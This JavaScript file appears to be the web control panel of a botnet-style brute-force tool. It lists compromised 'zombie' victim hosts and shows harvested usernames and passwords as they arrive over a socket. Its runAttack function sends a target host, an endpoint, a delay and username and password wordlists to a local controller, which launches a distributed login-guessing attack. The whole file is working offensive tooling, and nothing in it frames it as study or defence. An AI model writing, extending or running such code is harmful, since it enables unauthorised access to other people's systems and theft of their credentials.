(function() {
    const socket = io();

    socket.on('new-victim', function(host) {
        let item = document.createElement("li");
        item.setAttribute('class', 'text-success');
        item.textContent = host;
        document.getElementById('zombies').append(item);
    });

    socket.on('credentials', function({ username, password }) {
        let item = document.createElement("li");
        item.setAttribute('class', 'text-success');
        item.textContent = `Username: ${username} Password: ${password}`;
        document.getElementById('credentials').append(item);
    });

})();

const runAttack = async() => {
    const hostname = document.getElementById('to-attack').value;
    const endpoint = document.getElementById('endpoint').value;
    const delay = document.getElementById('delay').value;
    let usernames, passwords;
    usernames = document.getElementById('usernames').value;
    passwords = document.getElementById('passwords').value;
    let usernamesArray = ["admin", "username", "user", "blah123"];
    let passwordsArray = ["password", "pass", "apple", "hardToGuess", "12345"];
    if (usernames.length > 0) {
        usernamesArray = usernames.split(/\s/);
    }
    if (passwords.length > 0) {
        passwordsArray = passwords.split(/\s/);
    }
    const data = {
        host: hostname,
        endpoint: endpoint,
        delay: delay,
        usernames: usernamesArray,
        passwords: passwordsArray
    }
    axios.post("http://127.0.0.1:3001/run-attack", JSON.stringify(data), {
            headers: {
                'Content-Type': 'application/json'
            }
        })
        .then(res => {
            console.log("Attack running");
        })
        .catch(err => {
            console.error(err);
            if (err.response.status === 500) {
                alert("You need at least one active victim machine to begin an attack");
            }
        })

};